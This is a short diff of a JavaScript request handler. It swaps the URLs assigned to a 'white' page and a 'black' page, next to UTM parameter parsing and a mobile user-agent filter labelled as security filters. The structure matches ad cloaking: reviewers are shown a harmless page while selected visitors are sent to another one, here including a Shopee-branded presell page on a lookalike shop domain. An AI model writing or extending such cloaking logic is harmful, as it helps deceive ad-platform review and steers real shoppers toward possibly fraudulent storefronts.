@@ -10,8 +10,8 @@ export default function handler(req) {
   const utmCampaign = url.searchParams.get('utm_campaign') || '';
   const queryString = url.search; // Mantém o ? e todos os parâmetros
 
-  const pageWhite = "https://casadasspanelas.shop/shopee/presell-ml/";
-  const pageBlack = "https://cheerful-bloom-box.lovable.app/";
+  const pageWhite = "https://cheerful-bloom-box.lovable.app/";
+  const pageBlack = "https://casadasspanelas.shop/shopee/presell-ml/";
 
   // Filtros de Segurança
   const isMobile = /Android|iPhone|iPad|iPod/i.test(userAgent);
